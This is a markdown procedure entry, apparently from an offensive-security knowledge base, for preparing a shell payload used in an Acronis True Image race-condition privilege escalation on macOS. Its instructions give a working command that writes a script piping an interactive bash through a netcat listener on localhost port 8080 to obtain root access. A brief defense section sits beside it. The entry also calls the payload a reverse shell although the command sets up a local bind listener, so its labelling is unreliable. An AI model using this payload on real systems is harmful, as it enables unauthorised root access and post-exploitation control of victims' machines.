---
tags:
  - reverse-shell
  - payload
  - netcat
type: procedure
tools:
  - '[[tools/Netcat]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/create-reverse-shell-script]]'
verified: false
platforms:
  - macOS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:28:59.031Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 13a5b226-34ed-401e-af00-3a271fbe5ebe
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Prepare-Reverse-Shell-Payload

## Summary

This procedure creates a bash script that sets up a reverse shell using netcat and a FIFO pipe, listening on localhost port 8080 for incoming connections to provide interactive root access once exploited.

## Description

In the context of the Acronis True Image race condition exploit, this payload is invoked by the malicious binary to establish a bind shell on the local system. The script uses `mkfifo` to create a named pipe for bidirectional communication, piping bash input/output through netcat. This is a standard technique for gaining shell access in Unix-like environments, particularly useful in privilege escalation scenarios where direct shell spawning might be restricted.

## Requirements

1. Local admin access on macOS
2. Netcat installed (default on macOS)
3. Writable directory for script storage

## Defense

Defensive measures and detection strategies:

- Monitor for unexpected netcat processes (`ps aux | grep nc`)
- Block or log localhost port 8080 usage via firewall rules
- Audit FIFO creation in user directories

## Objectives

1. Establish a listening reverse shell for post-exploitation access
2. Enable interactive root command execution
3. Confirm exploit success via marker file

## Instructions

### Step 1: Create the Shell Script

**Context**: Generate the payload script that will be executed by the malicious binary to start the reverse shell.

**Command** ([[commands/create-reverse-shell-script]]):
```bash
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell
```

> This command writes the reverse shell setup to a file named 'shell'. The script creates a FIFO, starts netcat listening on localhost:8080, and pipes a interactive bash shell through it. Expected output: 'shell' file created; verify with `cat shell`.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Unix Shell

### Sub-Techniques


## Commands Used

- [[commands/create-reverse-shell-script]]

## Tools Used

- [[tools/Netcat]]

## Tags

- reverse-shell
- payload
- netcat
